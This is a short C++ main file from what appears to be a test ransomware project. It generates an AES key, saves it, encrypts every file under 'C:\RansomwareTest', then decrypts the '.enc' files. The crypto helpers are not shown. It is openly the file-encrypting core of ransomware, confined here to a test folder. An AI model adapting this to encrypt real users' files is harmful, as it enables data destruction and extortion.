#include <iostream>
#include <array>
#include <fstream>

#include "Crypto.h"
#include "FileWalker.h"

bool ends_with(std::string const & value, std::string const & ending);

int main()
{
	CryptoPP::AutoSeededRandomPool rng;
	AESKey filemasterkey = generateKey(rng);
	save_key(filemasterkey);

	FileWalker fileWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
		std::cout << filename << "\n";
		encrypt_file(filename, filemasterkey, rng);
	});
	fileWalker.start();

	FileWalker decryptionWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
		std::cout << filename << "\n";
		if (ends_with(filename, ".enc"))
		{
			decrypt_file(filename, filemasterkey);
		}
	});
	decryptionWalker.start();

	std::cin.get();
}

bool ends_with(std::string const & value, std::string const & ending)
{
	if (ending.size() > value.size()) return false;
	return std::equal(ending.rbegin(), ending.rend(), value.rbegin());
}

